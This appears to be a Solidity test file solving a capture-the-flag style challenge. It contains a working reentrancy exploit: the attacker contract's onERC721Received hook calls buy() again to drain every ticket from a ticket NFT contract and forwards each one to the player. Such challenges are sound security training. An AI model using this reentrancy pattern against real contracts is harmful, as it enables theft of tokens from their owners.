// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {LOLS14TicketBaseTest} from "test/LOLS14Ticket/LOLS14TicketBase.t.sol";
import {LOLS14Ticket} from "src/LOLS14Ticket/LOLS14Ticket.sol";

contract LOLS14TicketTest is LOLS14TicketBaseTest {
    function testLOLS14TicketExploit() public checkSolved {
        // DO NOT use any cheat codes here.
        // @todo drain all tickets from LOLS14Ticket contract
        Sylas sylas = new Sylas(lolS14Ticket);
        sylas.ult();
    }
}

contract Sylas {

    LOLS14Ticket lolS14Ticket;
    address player;

    constructor(LOLS14Ticket _lolS14Ticket) {
        lolS14Ticket = _lolS14Ticket;
        player = msg.sender;
        lolS14Ticket.setApprovalForAll(msg.sender, true);
    }

    function ult() public {
        lolS14Ticket.buy();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        try lolS14Ticket.buy() {
            lolS14Ticket.safeTransferFrom(address(this), player, tokenId);
        } catch {}
        return this.onERC721Received.selector;
    }
}